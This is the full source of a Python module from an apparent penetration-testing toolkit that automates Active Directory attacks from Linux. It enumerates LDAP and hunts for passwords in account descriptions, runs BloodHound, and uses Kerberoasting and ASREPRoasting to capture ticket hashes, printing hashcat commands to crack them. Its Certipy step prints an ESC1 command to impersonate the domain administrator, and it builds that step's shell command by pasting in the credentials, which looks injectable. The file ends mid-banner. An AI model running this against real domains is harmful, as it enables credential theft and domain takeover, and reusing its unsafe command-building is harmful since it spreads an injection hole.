"""
AD Enumerate All - Comprehensive Remote AD Enumeration
Runs full AD enumeration from Linux without RDP
Consolidates: LDAP queries, BloodHound, Kerberoasting, ASREPRoasting
LinPEAS-style colored output for security findings
"""

import subprocess
import os
import json
from datetime import datetime
from typing import Optional, List, Dict, Tuple
from core.module_base import ModuleBase, ModuleType, Platform, find_tool
from core.colors import Colors, Style, SecurityHighlighter as SH


class ADEnumerateAll(ModuleBase):
    """
    Comprehensive AD enumeration module - runs everything remotely
    No RDP required - uses LDAP, Kerberos, SMB from Linux

    Consolidates functionality from:
    - ad_enum (LDAP enumeration)
    - bloodhound_collect (BloodHound data collection)
    - kerberoast (Kerberoasting)
    - asreproast (ASREPRoasting)
    - powerview_autoenum (generates PowerView scripts if needed)
    """

    def __init__(self):
        super().__init__()
        self.name = "ad_enumerate_all"
        self.description = "Full AD enumeration from Linux - no RDP required"
        self.author = "UwU Toolkit"
        self.module_type = ModuleType.AUXILIARY
        self.platform = Platform.WINDOWS
        self.tags = ["ad", "enumeration", "ldap", "bloodhound", "kerberoast",
                     "asreproast", "comprehensive", "remote"]
        self.references = [
            "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology",
            "https://github.com/fox-it/BloodHound.py",
            "https://github.com/fortra/impacket"
        ]

        # Register options
        self.register_option("RHOSTS", "Domain Controller IP", required=True)
        self.register_option("DOMAIN", "Domain name (e.g., corp.local)", required=True)
        self.register_option("USER", "Domain username", required=True)
        self.register_option("PASS", "Domain password", required=True)
        self.register_option("OUTPUT_DIR", "Output directory for all results",
                           default="./ad_enum_results")

        # What to enumerate
        self.register_option("ENUM_LDAP", "Run LDAP enumeration", default="yes",
                           choices=["yes", "no"])
        self.register_option("ENUM_BLOODHOUND", "Run BloodHound collection", default="yes",
                           choices=["yes", "no"])
        self.register_option("ENUM_KERBEROAST", "Run Kerberoasting", default="yes",
                           choices=["yes", "no"])
        self.register_option("ENUM_ASREPROAST", "Run ASREPRoasting", default="yes",
                           choices=["yes", "no"])
        self.register_option("ENUM_SHARES", "Enumerate SMB shares", default="yes",
                           choices=["yes", "no"])
        self.register_option("ENUM_USERS", "Enumerate all users", default="yes",
                           choices=["yes", "no"])
        self.register_option("ENUM_PASSWORDS", "Check for passwords in descriptions", default="yes",
                           choices=["yes", "no"])
        self.register_option("ENUM_DELEGATION", "Check delegation settings", default="yes",
                           choices=["yes", "no"])
        self.register_option("ENUM_TRUSTS", "Enumerate domain trusts", default="yes",
                           choices=["yes", "no"])
        self.register_option("ENUM_GPOS", "Enumerate GPOs", default="yes",
                           choices=["yes", "no"])
        self.register_option("ENUM_PRIVGROUPS", "Enumerate privileged groups", default="yes",
                           choices=["yes", "no"])
        self.register_option("ENUM_ADCS", "Enumerate AD CS vulnerabilities (Certipy)", default="yes",
                           choices=["yes", "no"])

        # Container option for Exegol
        self.register_option("EXEGOL_CONTAINER", "Exegol container (auto-detect if empty)", default="")

        # Privileged groups to check
        self.privileged_groups = [
            ("Domain Admins", "CRITICAL", "Full domain admin rights"),
            ("Enterprise Admins", "CRITICAL", "Forest-wide admin rights"),
            ("Administrators", "CRITICAL", "Local admin on DCs"),
            ("Schema Admins", "CRITICAL", "Can modify AD schema, backdoor GPOs"),
            ("Account Operators", "HIGH", "Can modify non-protected accounts/groups"),
            ("Backup Operators", "HIGH", "Can backup SAM/NTDS, read registry, access DC filesystem"),
            ("Server Operators", "HIGH", "Can modify services, access SMB shares, backup files"),
            ("Print Operators", "HIGH", "Can logon to DCs, load malicious drivers"),
            ("DnsAdmins", "HIGH", "Can load DLL on DC, create WPAD record"),
            ("Hyper-V Administrators", "HIGH", "If virtual DCs exist, equals Domain Admin"),
            ("Remote Desktop Users", "MEDIUM", "May have RDP access to sensitive systems"),
            ("Remote Management Users", "MEDIUM", "PSRemoting access to DCs"),
            ("Group Policy Creator Owners", "MEDIUM", "Can create GPOs"),
        ]

        # Store results
        self.results = {}
        self.timestamp = None

    def run(self) -> bool:
        dc_ip = self.get_option("RHOSTS")
        domain = self.get_option("DOMAIN")
        user = self.get_option("USER")
        password = self.get_option("PASS")
        output_dir = self.get_option("OUTPUT_DIR")

        self.timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")

        # Create output directory
        os.makedirs(output_dir, exist_ok=True)

        # Print LinPEAS-style banner
        self._print_banner()
        self.print_line(f"{Colors.BRIGHT_CYAN}Target DC:{Colors.RESET} {Colors.BRIGHT_WHITE}{dc_ip}{Colors.RESET}")
        self.print_line(f"{Colors.BRIGHT_CYAN}Domain:{Colors.RESET} {Colors.BRIGHT_WHITE}{domain}{Colors.RESET}")
        self.print_line(f"{Colors.BRIGHT_CYAN}User:{Colors.RESET} {Colors.BRIGHT_WHITE}{user}{Colors.RESET}")
        self.print_line(f"{Colors.BRIGHT_CYAN}Output:{Colors.RESET} {Colors.BRIGHT_WHITE}{output_dir}{Colors.RESET}")
        self.print_line()

        # Build base DN
        base_dn = ",".join([f"DC={part}" for part in domain.split(".")])

        success_count = 0
        total_count = 0

        # 1. LDAP Enumeration
        if self.get_option("ENUM_LDAP") == "yes":
            total_count += 1
            if self._run_ldap_enum(dc_ip, domain, user, password, base_dn, output_dir):
                success_count += 1

        # 2. User enumeration with passwords in descriptions
        if self.get_option("ENUM_PASSWORDS") == "yes":
            total_count += 1
            if self._check_password_descriptions(dc_ip, domain, user, password, base_dn, output_dir):
                success_count += 1

        # 3. Delegation enumeration
        if self.get_option("ENUM_DELEGATION") == "yes":
            total_count += 1
            if self._check_delegation(dc_ip, domain, user, password, base_dn, output_dir):
                success_count += 1

        # 4. Trust enumeration
        if self.get_option("ENUM_TRUSTS") == "yes":
            total_count += 1
            if self._enum_trusts(dc_ip, domain, user, password, base_dn, output_dir):
                success_count += 1

        # 5. GPO enumeration
        if self.get_option("ENUM_GPOS") == "yes":
            total_count += 1
            if self._enum_gpos(dc_ip, domain, user, password, base_dn, output_dir):
                success_count += 1

        # 6. BloodHound collection
        if self.get_option("ENUM_BLOODHOUND") == "yes":
            total_count += 1
            if self._run_bloodhound(dc_ip, domain, user, password, output_dir):
                success_count += 1

        # 7. Kerberoasting
        if self.get_option("ENUM_KERBEROAST") == "yes":
            total_count += 1
            if self._run_kerberoast(dc_ip, domain, user, password, output_dir):
                success_count += 1

        # 8. ASREPRoasting
        if self.get_option("ENUM_ASREPROAST") == "yes":
            total_count += 1
            if self._run_asreproast(dc_ip, domain, user, password, output_dir):
                success_count += 1

        # 9. Share enumeration
        if self.get_option("ENUM_SHARES") == "yes":
            total_count += 1
            if self._enum_shares(dc_ip, domain, user, password, output_dir):
                success_count += 1

        # 10. Privileged groups enumeration
        if self.get_option("ENUM_PRIVGROUPS") == "yes":
            total_count += 1
            if self._enum_privileged_groups(dc_ip, domain, user, password, base_dn, output_dir):
                success_count += 1

        # 11. AD CS enumeration (Certipy)
        if self.get_option("ENUM_ADCS") == "yes":
            total_count += 1
            if self._enum_adcs(dc_ip, domain, user, password, output_dir):
                success_count += 1

        # Print findings summary
        self._print_summary(self.results)

        # Save consolidated results
        self._save_results(output_dir)

        # Print summary
        self.print_line()
        self.print_good("=" * 70)
        self.print_good("  ENUMERATION COMPLETE")
        self.print_good("=" * 70)
        self.print_status(f"Tasks completed: {success_count}/{total_count}")
        self.print_status(f"Results saved to: {output_dir}")
        self.print_line()

        # List output files
        self.print_status("Output files:")
        for f in sorted(os.listdir(output_dir)):
            fpath = os.path.join(output_dir, f)
            if os.path.isfile(fpath):
                size = os.path.getsize(fpath)
                self.print_line(f"  {f} ({size} bytes)")

        return success_count > 0

    def _run_cmd(self, cmd: List[str], timeout: int = 120) -> Tuple[int, str, str]:
        """Run a command and return exit code, stdout, stderr"""
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
            return result.returncode, result.stdout, result.stderr
        except subprocess.TimeoutExpired:
            return -1, "", "Command timed out"
        except Exception as e:
            return -1, "", str(e)

    def _run_ldap_enum(self, dc_ip: str, domain: str, user: str, password: str,
                       base_dn: str, output_dir: str) -> bool:
        """Run comprehensive LDAP enumeration"""
        self.print_line()
        self.print_status("[1/9] LDAP Enumeration")
        self.print_line("-" * 50)

        queries = {
            "domain_info": ("(objectClass=domain)", "distinguishedName name dc ms-DS-MachineAccountQuota"),
            "domain_controllers": ("(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))",
                                   "cn dNSHostName operatingSystem"),
            "users": ("(&(objectClass=user)(!(objectClass=computer)))",
                     "sAMAccountName userPrincipalName description memberOf userAccountControl adminCount"),
            "computers": ("(objectClass=computer)",
                         "cn dNSHostName operatingSystem operatingSystemVersion description userAccountControl"),
            "groups": ("(objectClass=group)", "cn description member managedBy adminCount"),
            "ous": ("(objectClass=organizationalUnit)", "name description"),
            "spn_users": ("(&(objectClass=user)(servicePrincipalName=*)(!(objectClass=computer)))",
                         "sAMAccountName servicePrincipalName memberOf"),
            "asrep_users": ("(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))",
                           "sAMAccountName userAccountControl"),
        }

        results = {}
        for name, (ldap_filter, attrs) in queries.items():
            cmd = [
                "ldapsearch", "-x",
                "-H", f"ldap://{dc_ip}",
                "-D", f"{user}@{domain}",
                "-w", password,
                "-b", base_dn,
                ldap_filter, attrs
            ]

            ret, stdout, stderr = self._run_cmd(cmd)

            if ret == 0:
                results[name] = stdout
                output_file = os.path.join(output_dir, f"ldap_{name}_{self.timestamp}.txt")
                with open(output_file, 'w') as f:
                    f.write(stdout)
                self.print_good(f"  {name}: OK")
            else:
                self.print_warning(f"  {name}: Failed")

        self.results['ldap'] = results
        return len(results) > 0

    def _check_password_descriptions(self, dc_ip: str, domain: str, user: str,
                                     password: str, base_dn: str, output_dir: str) -> bool:
        """Check for passwords in user/computer descriptions"""
        self.print_line(SH.subsection_header("Passwords in Descriptions"))

        findings = []

        # Check users
        cmd = [
            "ldapsearch", "-x",
            "-H", f"ldap://{dc_ip}",
            "-D", f"{user}@{domain}",
            "-w", password,
            "-b", base_dn,
            "(&(objectClass=user)(description=*))",
            "sAMAccountName description"
        ]

        ret, stdout, stderr = self._run_cmd(cmd)

        if ret == 0:
            # Parse results
            current_user = None
            for line in stdout.split('\n'):
                if line.startswith('sAMAccountName:'):
                    current_user = line.split(':')[1].strip()
                elif line.startswith('description:') and current_user:
                    desc = line.split(':', 1)[1].strip()
                    # Check for password-like content
                    password_indicators = ['pass', 'pwd', 'cred', 'secret', '!', '@', '#']
                    if any(ind.lower() in desc.lower() for ind in password_indicators):
                        findings.append(f"[USER] {current_user}: {desc}")
                        # CRITICAL finding - password in description!
                        self.print_line(f"  {Colors.CRITICAL} !! PASSWORD FOUND !! {Colors.RESET}")
                        self.print_line(f"     {Colors.HIGH}User:{Colors.RESET} {Colors.BRIGHT_WHITE}{current_user}{Colors.RESET}")
                        self.print_line(f"     {Colors.PASSWORD} {desc} {Colors.RESET}")

        # Check computers
        cmd = [
            "ldapsearch", "-x",
            "-H", f"ldap://{dc_ip}",
            "-D", f"{user}@{domain}",
            "-w", password,
            "-b", base_dn,
            "(&(objectClass=computer)(description=*))",
            "cn description"
        ]

        ret, stdout, stderr = self._run_cmd(cmd)

        if ret == 0:
            current_computer = None
            for line in stdout.split('\n'):
                if line.startswith('cn:'):
                    current_computer = line.split(':')[1].strip()
                elif line.startswith('description:') and current_computer:
                    desc = line.split(':', 1)[1].strip()
                    password_indicators = ['pass', 'pwd', 'cred', 'secret', '!', '@', '#']
                    if any(ind.lower() in desc.lower() for ind in password_indicators):
                        findings.append(f"[COMPUTER] {current_computer}: {desc}")
                        # CRITICAL finding - password in description!
                        self.print_line(f"  {Colors.CRITICAL} !! PASSWORD FOUND !! {Colors.RESET}")
                        self.print_line(f"     {Colors.HIGH}Computer:{Colors.RESET} {Colors.BRIGHT_WHITE}{current_computer}{Colors.RESET}")
                        self.print_line(f"     {Colors.PASSWORD} {desc} {Colors.RESET}")

        if findings:
            output_file = os.path.join(output_dir, f"passwords_in_descriptions_{self.timestamp}.txt")
            with open(output_file, 'w') as f:
                f.write('\n'.join(findings))
            self.print_line(f"\n  {Colors.CRITICAL} FOUND {len(findings)} PASSWORDS IN DESCRIPTIONS! {Colors.RESET}")
        else:
            self.print_line(f"  {Colors.DIM}No passwords found in descriptions{Colors.RESET}")

        self.results['password_descriptions'] = findings
        return True

    def _check_delegation(self, dc_ip: str, domain: str, user: str,
                          password: str, base_dn: str, output_dir: str) -> bool:
        """Check for delegation settings"""
        self.print_line(SH.subsection_header("Delegation Settings"))

        findings = []

        # Unconstrained delegation (computers)
        # UAC flag 524288 = TRUSTED_FOR_DELEGATION
        cmd = [
            "ldapsearch", "-x",
            "-H", f"ldap://{dc_ip}",
            "-D", f"{user}@{domain}",
            "-w", password,
            "-b", base_dn,
            "(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))",
            "cn dNSHostName userAccountControl"
        ]

        ret, stdout, stderr = self._run_cmd(cmd)
        if ret == 0 and "cn:" in stdout:
            self.print_line(f"  {Colors.HIGH}►{Colors.RESET} {Colors.HIGH}UNCONSTRAINED DELEGATION{Colors.RESET}")
            findings.append("[UNCONSTRAINED DELEGATION]\n" + stdout)
            for line in stdout.split('\n'):
                if line.startswith('cn:'):
                    computer = line.split(':')[1].strip()
                    self.print_line(f"    {Colors.PRIVESC} {computer} {Colors.RESET}")
                    self.print_line(f"    {Colors.DIM}Attack: Capture TGT, impersonate any user{Colors.RESET}")

        # Constrained delegation
        cmd = [
            "ldapsearch", "-x",
            "-H", f"ldap://{dc_ip}",
            "-D", f"{user}@{domain}",
            "-w", password,
            "-b", base_dn,
            "(msDS-AllowedToDelegateTo=*)",
            "sAMAccountName msDS-AllowedToDelegateTo"
        ]

        ret, stdout, stderr = self._run_cmd(cmd)
        if ret == 0 and "sAMAccountName:" in stdout:
            self.print_line(f"  {Colors.MEDIUM}►{Colors.RESET} {Colors.MEDIUM}CONSTRAINED DELEGATION{Colors.RESET}")
            findings.append("[CONSTRAINED DELEGATION]\n" + stdout)
            for line in stdout.split('\n'):
                if line.startswith('sAMAccountName:'):
                    account = line.split(':')[1].strip()
                    self.print_line(f"    {Colors.BRIGHT_YELLOW}Account:{Colors.RESET} {account}")

        # Resource-based constrained delegation
        cmd = [
            "ldapsearch", "-x",
            "-H", f"ldap://{dc_ip}",
            "-D", f"{user}@{domain}",
            "-w", password,
            "-b", base_dn,
            "(msDS-AllowedToActOnBehalfOfOtherIdentity=*)",
            "sAMAccountName"
        ]

        ret, stdout, stderr = self._run_cmd(cmd)
        if ret == 0 and "sAMAccountName:" in stdout:
            self.print_line(f"  {Colors.MEDIUM}►{Colors.RESET} {Colors.MEDIUM}RESOURCE-BASED CONSTRAINED DELEGATION{Colors.RESET}")
            findings.append("[RBCD]\n" + stdout)

        if findings:
            output_file = os.path.join(output_dir, f"delegation_{self.timestamp}.txt")
            with open(output_file, 'w') as f:
                f.write('\n\n'.join(findings))
            self.print_line(f"\n  {Colors.HIGH}Found {len(findings)} delegation configurations!{Colors.RESET}")
        else:
            self.print_line(f"  {Colors.DIM}No dangerous delegation settings found{Colors.RESET}")

        self.results['delegation'] = findings
        return True

    def _enum_trusts(self, dc_ip: str, domain: str, user: str,
                     password: str, base_dn: str, output_dir: str) -> bool:
        """Enumerate domain trusts"""
        self.print_line()
        self.print_status("[4/9] Enumerating Domain Trusts")
        self.print_line("-" * 50)

        cmd = [
            "ldapsearch", "-x",
            "-H", f"ldap://{dc_ip}",
            "-D", f"{user}@{domain}",
            "-w", password,
            "-b", base_dn,
            "(objectClass=trustedDomain)",
            "cn trustPartner trustDirection trustType trustAttributes flatName"
        ]

        ret, stdout, stderr = self._run_cmd(cmd)

        if ret == 0:
            if "trustPartner:" in stdout:
                self.print_good("  Domain trusts found:")
                for line in stdout.split('\n'):
                    if line.startswith('trustPartner:'):
                        trust = line.split(':')[1].strip()
                        self.print_status(f"    Trust: {trust}")
                    elif line.startswith('trustDirection:'):
                        direction = line.split(':')[1].strip()
                        dir_map = {'1': 'Inbound', '2': 'Outbound', '3': 'Bidirectional'}
                        self.print_status(f"      Direction: {dir_map.get(direction, direction)}")

                output_file = os.path.join(output_dir, f"trusts_{self.timestamp}.txt")
                with open(output_file, 'w') as f:
                    f.write(stdout)
            else:
                self.print_status("  No trusts found")

            self.results['trusts'] = stdout
            return True

        self.print_warning("  Trust enumeration failed")
        return False

    def _enum_gpos(self, dc_ip: str, domain: str, user: str,
                   password: str, base_dn: str, output_dir: str) -> bool:
        """Enumerate Group Policy Objects"""
        self.print_line()
        self.print_status("[5/9] Enumerating GPOs")
        self.print_line("-" * 50)

        cmd = [
            "ldapsearch", "-x",
            "-H", f"ldap://{dc_ip}",
            "-D", f"{user}@{domain}",
            "-w", password,
            "-b", f"CN=Policies,CN=System,{base_dn}",
            "(objectClass=groupPolicyContainer)",
            "displayName cn gPCFileSysPath"
        ]

        ret, stdout, stderr = self._run_cmd(cmd)

        if ret == 0:
            gpo_count = stdout.count('displayName:')
            self.print_good(f"  Found {gpo_count} GPOs")

            output_file = os.path.join(output_dir, f"gpos_{self.timestamp}.txt")
            with open(output_file, 'w') as f:
                f.write(stdout)

            self.results['gpos'] = stdout
            return True

        self.print_warning("  GPO enumeration failed")
        return False

    def _run_bloodhound(self, dc_ip: str, domain: str, user: str,
                        password: str, output_dir: str) -> bool:
        """Run BloodHound collection"""
        self.print_line()
        self.print_status("[6/9] BloodHound Collection")
        self.print_line("-" * 50)

        bh_path = find_tool("bloodhound-python") or find_tool("bloodhound.py")
        if not bh_path:
            self.print_warning("  bloodhound-python not found, skipping")
            return False

        bh_output = os.path.join(output_dir, "bloodhound")
        os.makedirs(bh_output, exist_ok=True)

        cmd = [
            bh_path,
            "-u", user,
            "-p", password,
            "-d", domain,
            "-dc", dc_ip,
            "-ns", dc_ip,
            "-c", "all",
            "--output-dir", bh_output,
            "--zip"
        ]

        self.print_status("  Running collection (this may take a while)...")
        ret, stdout, stderr = self._run_cmd(cmd, timeout=600)

        if ret == 0 or "Done" in stderr:
            self.print_good("  BloodHound collection complete")
            for f in os.listdir(bh_output):
                if f.endswith('.zip'):
                    self.print_good(f"    Output: {f}")
            self.results['bloodhound'] = "Collection complete"
            return True

        self.print_warning(f"  BloodHound collection failed: {stderr[:100]}")
        return False

    def _run_kerberoast(self, dc_ip: str, domain: str, user: str,
                        password: str, output_dir: str) -> bool:
        """Run Kerberoasting"""
        self.print_line(SH.subsection_header("Kerberoasting"))

        tool_path = find_tool("GetUserSPNs.py")
        if not tool_path:
            self.print_line(f"  {Colors.DIM}GetUserSPNs.py not found, skipping{Colors.RESET}")
            return False

        output_file = os.path.join(output_dir, f"kerberoast_hashes_{self.timestamp}.txt")

        cmd = [
            tool_path,
            f"{domain}/{user}:{password}",
            "-dc-ip", dc_ip,
            "-request",
            "-outputfile", output_file
        ]

        ret, stdout, stderr = self._run_cmd(cmd)

        if ret == 0:
            if os.path.exists(output_file) and os.path.getsize(output_file) > 0:
                hash_count = sum(1 for line in open(output_file) if line.strip())
                self.print_line(f"  {Colors.HIGH}►{Colors.RESET} {Colors.HIGH}KERBEROASTABLE USERS FOUND!{Colors.RESET}")
                self.print_line(f"    {Colors.HASH} {hash_count} TGS hashes captured {Colors.RESET}")
                self.print_line(f"    {Colors.BRIGHT_GREEN}Crack:{Colors.RESET} hashcat -m 13100 {output_file} wordlist.txt")
            else:
                self.print_line(f"  {Colors.DIM}No Kerberoastable users found{Colors.RESET}")
            self.results['kerberoast'] = stdout
            return True

        self.print_line(f"  {Colors.DIM}Kerberoasting failed{Colors.RESET}")
        return False

    def _run_asreproast(self, dc_ip: str, domain: str, user: str,
                        password: str, output_dir: str) -> bool:
        """Run ASREPRoasting"""
        self.print_line(SH.subsection_header("ASREPRoasting"))

        tool_path = find_tool("GetNPUsers.py")
        if not tool_path:
            self.print_line(f"  {Colors.DIM}GetNPUsers.py not found, skipping{Colors.RESET}")
            return False

        output_file = os.path.join(output_dir, f"asrep_hashes_{self.timestamp}.txt")

        cmd = [
            tool_path,
            f"{domain}/{user}:{password}",
            "-dc-ip", dc_ip,
            "-request",
            "-outputfile", output_file
        ]

        ret, stdout, stderr = self._run_cmd(cmd)

        if ret == 0:
            if os.path.exists(output_file) and os.path.getsize(output_file) > 0:
                hash_count = sum(1 for line in open(output_file) if line.strip())
                self.print_line(f"  {Colors.HIGH}►{Colors.RESET} {Colors.HIGH}ASREPROASTABLE USERS FOUND!{Colors.RESET}")
                self.print_line(f"    {Colors.HASH} {hash_count} AS-REP hashes captured {Colors.RESET}")
                self.print_line(f"    {Colors.BRIGHT_GREEN}Crack:{Colors.RESET} hashcat -m 18200 {output_file} wordlist.txt")
            else:
                self.print_line(f"  {Colors.DIM}No ASREPRoastable users found{Colors.RESET}")
            self.results['asreproast'] = stdout
            return True

        self.print_line(f"  {Colors.DIM}ASREPRoasting failed{Colors.RESET}")
        return False

    def _enum_shares(self, dc_ip: str, domain: str, user: str,
                     password: str, output_dir: str) -> bool:
        """Enumerate SMB shares"""
        self.print_line()
        self.print_status("[9/9] SMB Share Enumeration")
        self.print_line("-" * 50)

        nxc_path = find_tool("nxc") or find_tool("netexec") or find_tool("crackmapexec")
        if not nxc_path:
            self.print_warning("  netexec/nxc not found, skipping")
            return False

        cmd = [nxc_path, "smb", dc_ip, "-u", user, "-p", password, "--shares"]
        ret, stdout, stderr = self._run_cmd(cmd)

        if ret == 0 or "Enumerated shares" in stdout:
            self.print_good("  Shares enumerated:")
            for line in stdout.split('\n'):
                if 'READ' in line or 'WRITE' in line:
                    self.print_status(f"    {line.strip()}")

            output_file = os.path.join(output_dir, f"shares_{self.timestamp}.txt")
            with open(output_file, 'w') as f:
                f.write(stdout)

            self.results['shares'] = stdout
            return True

        self.print_warning("  Share enumeration failed")
        return False

    def _enum_privileged_groups(self, dc_ip: str, domain: str, user: str,
                                 password: str, base_dn: str, output_dir: str) -> bool:
        """Enumerate privileged AD groups and their members"""
        self.print_line(SH.section_header("PRIVILEGED GROUPS"))

        findings = []
        total_members = 0

        for group_name, severity, description in self.privileged_groups:
            cmd = [
                "ldapsearch", "-x",
                "-H", f"ldap://{dc_ip}",
                "-D", f"{user}@{domain}",
                "-w", password,
                "-b", base_dn,
                f"(&(objectClass=group)(cn={group_name}))",
                "member"
            ]

            ret, stdout, stderr = self._run_cmd(cmd)

            if ret == 0:
                # Parse members
                members = []
                for line in stdout.split('\n'):
                    if line.startswith('member:'):
                        member_dn = line.split(':', 1)[1].strip()
                        # Extract CN from DN
                        if 'CN=' in member_dn:
                            cn = member_dn.split(',')[0].replace('CN=', '')
                            members.append(cn)

                if members:
                    total_members += len(members)

                    # Color based on severity
                    if severity == "CRITICAL":
                        icon = f"{Colors.CRITICAL} !! {Colors.RESET}"
                        color = Colors.HIGH
                    elif severity == "HIGH":
                        icon = f"{Colors.HIGH}►{Colors.RESET}"
                        color = Colors.MEDIUM
                    else:
                        icon = f"{Colors.MEDIUM}►{Colors.RESET}"
                        color = Colors.LOW

                    self.print_line(f"  {icon} {color}{group_name}{Colors.RESET} ({len(members)} members)")
                    self.print_line(f"      {Colors.DIM}{description}{Colors.RESET}")

                    for member in members[:5]:  # Show first 5
                        self.print_line(f"      {Colors.BRIGHT_WHITE}• {member}{Colors.RESET}")
                    if len(members) > 5:
                        self.print_line(f"      {Colors.DIM}... and {len(members) - 5} more{Colors.RESET}")

                    findings.append({
                        "group": group_name,
                        "severity": severity,
                        "members": members,
                        "description": description
                    })

        if findings:
            output_file = os.path.join(output_dir, f"privileged_groups_{self.timestamp}.txt")
            with open(output_file, 'w') as f:
                for finding in findings:
                    f.write(f"[{finding['severity']}] {finding['group']}\n")
                    f.write(f"Description: {finding['description']}\n")
                    f.write(f"Members ({len(finding['members'])}):\n")
                    for member in finding['members']:
                        f.write(f"  - {member}\n")
                    f.write("\n")

            self.print_line()
            if any(f['severity'] == 'CRITICAL' for f in findings):
                self.print_line(f"  {Colors.CRITICAL} {total_members} users in privileged groups! {Colors.RESET}")
            else:
                self.print_line(f"  {Colors.BRIGHT_GREEN}Found {total_members} users in privileged groups{Colors.RESET}")

        else:
            self.print_line(f"  {Colors.DIM}No privileged group members found{Colors.RESET}")

        self.results['privileged_groups'] = findings
        return True

    def _enum_adcs(self, dc_ip: str, domain: str, user: str,
                   password: str, output_dir: str) -> bool:
        """Enumerate AD CS vulnerabilities using Certipy"""
        self.print_line(SH.section_header("AD CS ENUMERATION"))

        certipy_path = "/root/.local/share/pipx/venvs/netexec/bin/certipy"
        cmd = f"{certipy_path} find -u '{user}@{domain}' -p '{password}' -dc-ip {dc_ip} -stdout -vulnerable"

        self.print_line(f"  {Colors.DIM}Command: certipy find -u {user}@{domain} -p [HIDDEN] -dc-ip {dc_ip} -vulnerable{Colors.RESET}")

        ret, stdout, stderr = self.run_in_exegol(cmd, timeout=180)
        output = stdout + stderr

        if not output.strip():
            self.print_line(f"  {Colors.DIM}Certipy not available or no output{Colors.RESET}")
            return False

        # Save raw output
        output_file = os.path.join(output_dir, f"adcs_certipy_{self.timestamp}.txt")
        with open(output_file, 'w') as f:
            f.write(output)

        # Parse for vulnerabilities
        vulnerabilities = []
        current_template = None
        current_ca = None

        for line in output.split('\n'):
            stripped = line.strip()

            if "CA Name" in line and ":" in line:
                current_ca = line.split(":", 1)[1].strip()
                self.print_line(f"  {Colors.BRIGHT_GREEN}Certificate Authority:{Colors.RESET} {current_ca}")

            if "Template Name" in line and ":" in line:
                current_template = line.split(":", 1)[1].strip()

            if "[!] Vulnerabilities" in line:
                self.print_line(f"  {Colors.HIGH}►{Colors.RESET} {Colors.HIGH}Template: {current_template}{Colors.RESET}")

            # Check for specific ESC vulnerabilities
            if "ESC1" in stripped:
                self.print_line(f"    {Colors.CRITICAL} !! ESC1 - Enrollee Supplies Subject !! {Colors.RESET}")
                self.print_line(f"       {Colors.BRIGHT_WHITE}Can impersonate ANY user (Domain Admin!){Colors.RESET}")
                self.print_line(f"       {Colors.DIM}Exploit: certipy req -template {current_template} -upn administrator@{domain}{Colors.RESET}")
                vulnerabilities.append({"type": "ESC1", "template": current_template, "ca": current_ca})

            elif "ESC2" in stripped:
                self.print_line(f"    {Colors.HIGH}►{Colors.RESET} {Colors.HIGH}ESC2 - Any Purpose EKU{Colors.RESET}")
                vulnerabilities.append({"type": "ESC2", "template": current_template, "ca": current_ca})

            elif "ESC3" in stripped:
                self.print_line(f"    {Colors.HIGH}►{Colors.RESET} {Colors.HIGH}ESC3 - Enrollment Agent{Colors.RESET}")
                vulnerabilities.append({"type": "ESC3", "template": current_template, "ca": current_ca})

            elif "ESC4" in stripped:
                self.print_line(f"    {Colors.HIGH}►{Colors.RESET} {Colors.HIGH}ESC4 - Vulnerable Template ACL{Colors.RESET}")
                vulnerabilities.append({"type": "ESC4", "template": current_template, "ca": current_ca})

            elif "ESC8" in stripped:
                self.print_line(f"    {Colors.HIGH}►{Colors.RESET} {Colors.HIGH}ESC8 - Web Enrollment NTLM Relay{Colors.RESET}")
                vulnerabilities.append({"type": "ESC8", "template": current_template, "ca": current_ca})

            # Enrollment rights
            if "Enrollee Supplies Subject" in line and "True" in line:
                self.print_line(f"    {Colors.CRITICAL}Enrollee Supplies Subject: True{Colors.RESET}")

            if "Client Authentication" in line and "True" in line:
                self.print_line(f"    {Colors.BRIGHT_GREEN}Client Authentication: True{Colors.RESET}")

        if vulnerabilities:
            self.print_line()
            self.print_line(f"  {Colors.CRITICAL} FOUND {len(vulnerabilities)} AD CS VULNERABILITY(IES)! {Colors.RESET}")
            self.print_line(f"  {Colors.BRIGHT_GREEN}Use: auxiliary/ad/certipy_exploit{Colors.RESET}")
        else:
            self.print_line(f"  {Colors.DIM}No vulnerable certificate templates found{Colors.RESET}")

        self.results['adcs'] = vulnerabilities
        return True

    def _save_results(self, output_dir: str) -> None:
        """Save consolidated results to JSON"""
        output_file = os.path.join(output_dir, f"enum_summary_{self.timestamp}.json")

        summary = {
            "timestamp": self.timestamp,
            "target": self.get_option("RHOSTS"),
            "domain": self.get_option("DOMAIN"),
            "user": self.get_option("USER"),
            "results": {
                "password_findings": self.results.get('password_descriptions', []),
                "delegation_findings": len(self.results.get('delegation', [])),
                "trusts_found": 'trustPartner' in self.results.get('trusts', ''),
                "kerberoast_ran": 'kerberoast' in self.results,
                "asreproast_ran": 'asreproast' in self.results,
                "bloodhound_ran": 'bloodhound' in self.results,
            }
        }

        with open(output_file, 'w') as f:
            json.dump(summary, f, indent=2)

    def _print_banner(self) -> None:
        """Print LinPEAS-style banner"""
        banner = f"""
{Colors.BRIGHT_CYAN}
    ╔══════════════════════════════════════════════════════════════════╗
    ║{Colors.BRIGHT_YELLOW}     _    ____    _____ _   _ _   _ __  __ _____ ____      _  _____ {Colors.BRIGHT_CYAN}║
    ║{Colors.BRIGHT_YELLOW}    / \\  |  _ \\  | ____| \\ | | | | |  \\/  | ____|  _ \\    / \\|_   _|{Colors.BRIGHT_CYAN}║
    ║{Colors.BRIGHT_YELLOW}   / _ \\ | | | | |  _| |  \\| | | | | |\\/| |  _| | |_) |  / _ \\ | |  {Colors.BRIGHT_CYAN}║
    ║{Colors.BRIGHT_YELLOW}  / ___ \\| |_| | | |___| |\\  | |_| | |  | | |___|  _ <  / ___ \\| |  {Colors.BRIGHT_CYAN}║
    ║{Colors.BRIGHT_YELLOW} /_/   \\_\\____/  |_____|_| \\_|\\___/|_|  |_|_____|_| \\_\\/_/   \\_\\_|  {Colors.BRIGHT_CYAN}║
    ║                                                                  ║
    ║{Colors.BRIGHT_WHITE}     Comprehensive AD Enumeration - No RDP Required              {Colors.BRIGHT_CYAN}║
    ╚══════════════════════════════════════════════════════════════════╝
{Colors.RESET}
